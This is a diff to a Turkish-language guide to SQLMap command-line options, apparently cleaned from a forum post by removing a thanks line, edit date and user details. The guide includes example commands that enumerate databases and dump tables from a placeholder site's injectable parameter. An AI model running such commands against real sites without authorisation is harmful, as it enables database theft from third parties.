@@ -1,3 +1,5 @@
+SQLMap komutları:
+
 
 -h, --help:klasik basit kullanım özelliklerini yazdıran komuttur.
 
@@ -447,21 +449,7 @@ sqlmap -u "www.siteadi.com/testet.php?id=1" --exclude-sysdb --dbs
 sqlmap -u "www.site.com/testet.php?id=1" -D db -T tbl --where="category_id=1"
 
 --------------------------------------------------------------------------------------
-Teşekkür :RpS_razz:
---------------------------------------------------------------------------------------
 
-Son düzenleme: 14 Ağu 2017
- 
-sevban035
-Katılımcı Üye
- 
-18 Tem 2012
-687
-3
-kaf
-•	9 Nis 2017
-•	
-•	#2
 --eta: Eğer test ettiğimiz sitemiz üzerinde açık varsa ve bu açıkları kullanarak dump işlemi gerçekleştirebiliyorsak, kalan zamanı öğrenebileceğimiz parametremiz. Örnek olarak:
 
 sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --columns --eta
